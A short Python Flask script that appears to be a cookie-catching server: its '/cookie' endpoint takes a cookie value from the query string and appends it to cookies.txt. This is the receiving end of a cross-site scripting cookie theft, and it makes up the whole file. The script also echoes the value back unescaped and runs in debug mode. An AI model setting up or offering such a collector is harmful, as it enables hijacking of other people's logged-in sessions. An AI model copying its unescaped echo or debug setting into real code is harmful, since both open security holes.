from flask import Flask, jsonify, request
  
app = Flask(__name__)
  
  
@app.route('/cookie', methods=['GET'])
def helloworld():
    if request.method == 'GET':
      cookie = request.args.get('cookie')
      with open('cookies.txt', 'a') as f:
            f.write(str(cookie)+"\n")
      return cookie

  
if __name__ == '__main__':
    app.run(debug=True)
